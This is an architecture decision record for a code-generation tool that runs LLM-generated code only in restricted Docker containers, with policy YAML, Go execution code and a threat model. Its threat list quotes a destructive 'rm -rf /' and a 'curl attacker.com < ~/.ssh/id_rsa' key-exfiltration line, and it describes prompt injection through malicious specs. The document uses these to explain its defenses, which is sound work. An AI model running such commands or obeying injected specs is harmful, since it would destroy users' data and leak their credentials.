# ADR 0003: Docker-Only Execution for Code Generation

**Status:** Accepted

**Date:** 2025-01-07

**Decision Makers:** Specular Core Team

## Context

Specular generates code using LLM providers (Anthropic, OpenAI, Google) based on product specifications. Generated code is then executed to build, test, and validate the implementation. This creates a significant security risk: **untrusted code from AI models could execute arbitrary commands on the user's machine.**

### Security Threats

#### Threat 1: Malicious Code Injection
An LLM could generate code that:
- Deletes files (`rm -rf /`)
- Exfiltrates data (`curl attacker.com < ~/.ssh/id_rsa`)
- Installs backdoors
- Modifies system configuration

#### Threat 2: Prompt Injection Attacks
A malicious spec could contain prompts that:
- Override safety instructions
- Generate code to steal environment variables
- Create reverse shells
- Modify the spec.lock to hide malicious changes

#### Threat 3: Supply Chain Attacks
Generated code could:
- Install malicious dependencies
- Modify package lock files
- Tamper with build artifacts

### Industry Precedents
- **GitHub Codespaces**: Sandboxed dev environments
- **Replit**: Container-based code execution
- **AWS Lambda**: Isolated execution environments
- **Google Cloud Run**: Sandboxed containers

## Decision

**All code generation and execution MUST happen inside Docker containers with strict resource limits and network restrictions.**

### Security Model

#### Principle 1: Zero Trust
- Never trust generated code
- Assume adversarial prompts
- Validate all outputs

#### Principle 2: Defense in Depth
1. **Sandboxing**: Docker isolation
2. **Resource Limits**: CPU, memory, disk quotas
3. **Network Restrictions**: No internet access (configurable)
4. **Image Allowlist**: Only approved base images
5. **Capability Dropping**: Remove privileged capabilities

#### Principle 3: Fail Secure
- Default deny (Docker required)
- Explicit opt-in for local execution (with warnings)
- Policy enforcement before execution

## Implementation

### Policy Enforcement
```yaml
# .specular/policy.yaml
execution:
  allow_local: false  # REQUIRED: Must be explicitly enabled
  docker:
    required: true    # Enforced by default
    image_allowlist:
      - golang:1.22-alpine
      - node:20-alpine
      - python:3.11-alpine
    resource_limits:
      cpu: "2"
      memory: "2g"
      disk: "5g"
    network: "none"    # No internet access
    privileged: false  # No privileged mode
```

### Docker Execution
```go
func ExecuteInDocker(task Task, policy *Policy) (*Result, error) {
    // Validate image is allowlisted
    if !isAllowed(task.Image, policy.Docker.ImageAllowlist) {
        return nil, fmt.Errorf("image not allowlisted: %s", task.Image)
    }

    // Build Docker run command with restrictions
    cmd := exec.Command("docker", "run",
        "--rm",                          // Remove container after exit
        "--network", policy.Docker.Network,  // Network mode
        "--cpus", policy.Docker.CPU,     // CPU limit
        "--memory", policy.Docker.Memory, // Memory limit
        "--security-opt=no-new-privileges", // Prevent privilege escalation
        "--cap-drop=ALL",                // Drop all capabilities
        "--read-only",                   // Read-only filesystem
        "-v", fmt.Sprintf("%s:/workspace", workspaceDir), // Mount workspace
        task.Image,
        task.Command...,
    )

    return runWithTimeout(cmd, policy.Timeout)
}
```

### Local Execution (Opt-In with Warnings)
```bash
# Local execution is DISABLED by default
specular build --plan plan.json
# Error: Local execution is disabled. Enable with --allow-local

# Must explicitly enable with warning
specular build --plan plan.json --allow-local
# WARNING: Executing generated code locally without Docker isolation!
# WARNING: This could delete files, exfiltrate data, or damage your system!
# Are you sure? (yes/no):
```

## Alternatives Considered

### Option 1: Local Execution by Default
**Pros:**
- Faster (no Docker overhead)
- Simpler setup
- Native tooling access

**Cons:**
- ❌ **UNSAFE**: Full host access
- ❌ No isolation
- ❌ Supply chain risk
- ❌ No resource limits

**Verdict:** REJECTED (unacceptable security risk)

### Option 2: VM-Based Isolation (Firecracker, gVisor)
**Pros:**
- Stronger isolation than Docker
- Faster startup than full VMs

**Cons:**
- Complex setup
- Platform-specific (Linux only)
- Additional dependencies
- Higher resource usage

**Verdict:** Future consideration for enterprise version

### Option 3: Process Sandboxing (seccomp, AppArmor)
**Pros:**
- Lighter than containers
- Native performance

**Cons:**
- Linux-only
- Complex configuration
- Harder to enforce uniformly
- Limited filesystem isolation

**Verdict:** REJECTED (insufficient isolation)

### Option 4: WebAssembly/Wasm (WASI)
**Pros:**
- True sandboxing
- Cross-platform
- No container needed

**Cons:**
- Limited language support
- No native code execution
- Immature ecosystem
- Performance overhead

**Verdict:** Future possibility (not ready for v1.0)

## Consequences

### Positive
- ✅ **Strong Security**: Malicious code cannot access host
- ✅ **Reproducibility**: Same environment every time
- ✅ **Resource Control**: Prevent resource exhaustion
- ✅ **Auditability**: All execution logged
- ✅ **Industry Standard**: Docker is ubiquitous

### Negative
- ❌ **Performance Overhead**: ~100-500ms startup per container
- ❌ **Disk Usage**: Docker images (~200MB-1GB each)
- ❌ **Setup Complexity**: Requires Docker installation
- ❌ **Platform Limitations**: Needs Docker Desktop on Mac/Windows

### Mitigations

#### Mitigation 1: Docker Image Caching
- Cache pulled images locally
- Export/import for CI/CD
- **Result**: 94% speedup (80s → 5s) on cached runs

#### Mitigation 2: Multi-Stage Builds
- Small Alpine-based images
- Layer caching
- **Result**: Images ~50MB instead of 500MB

#### Mitigation 3: Clear Setup Docs
- Installation guide with Docker setup
- Pre-flight checks
- Troubleshooting guide

#### Mitigation 4: Performance Monitoring
- Track container startup time
- Alert on slow operations
- Optimize hot paths

## Security Guarantees

### What Docker Provides
✅ Filesystem isolation
✅ Process isolation
✅ Network isolation (when configured)
✅ Resource limits (CPU, memory, I/O)
✅ Capability restrictions
✅ User namespace isolation

### What Docker Does NOT Provide
❌ Kernel-level exploits (same kernel as host)
❌ Container escape vulnerabilities (rare but possible)
❌ Side-channel attacks (Spectre, Meltdown)

### Additional Hardening
```yaml
# Additional security measures
docker:
  user: "1000:1000"        # Run as non-root user
  tmpfs:
    - /tmp                 # Tmpfs for temporary files
  security_opt:
    - "no-new-privileges"  # Prevent privilege escalation
    - "seccomp=default"    # Seccomp profile
  cap_drop:
    - ALL                  # Drop all capabilities
  cap_add:
    - NET_BIND_SERVICE     # Only if needed
```

## Threat Model

### In-Scope Threats (Mitigated)
✅ Malicious code execution on host
✅ File system access/deletion
✅ Data exfiltration
✅ Privilege escalation
✅ Resource exhaustion (DoS)
✅ Supply chain attacks (via dependencies)

### Out-of-Scope Threats (Accepted Risk)
⚠️ Kernel exploits (rare, requires Docker vulnerability)
⚠️ Container escape (monitor CVEs, update Docker)
⚠️ Time-of-check-time-of-use (TOCTOU) in generated code

### Incident Response
1. **Kill Container**: Immediate termination on suspicious activity
2. **Review Logs**: Inspect Docker logs and generated code
3. **Report Issue**: Submit findings to security team
4. **Update Allowlist**: Block malicious images

## Compliance & Regulations

### SOC 2 Compliance
- Docker provides audit trail
- Resource limits enforce availability
- Network restrictions enforce confidentiality

### GDPR/Privacy
- No data leaves container (network=none)
- Generated code is ephemeral
- Logs are local-only

### Enterprise Requirements
- Meets air-gapped environment needs
- Compatible with corporate Docker registries
- Supports private base images

## Future Enhancements

### Short-term (v1.1-v1.2)
- [ ] gVisor integration for stronger isolation
- [ ] Custom seccomp profiles
- [ ] Real-time security monitoring

### Long-term (v2.0+)
- [ ] Firecracker microVMs for maximum isolation
- [ ] WASI-based execution for lightweight sandboxing
- [ ] Hardware-based TEE (Trusted Execution Environment)

## Related Decisions
- ADR 0002: Checkpoint Mechanism (affects container artifact storage)
- ADR 0004: Provider Abstraction (impacts prompt safety)
- Future ADR: Network policy and external API access

## References
- [Docker Security](https://docs.docker.com/engine/security/)
- [OWASP Container Security](https://owasp.org/www-community/vulnerabilities/Container_Security)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [NIST Application Container Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
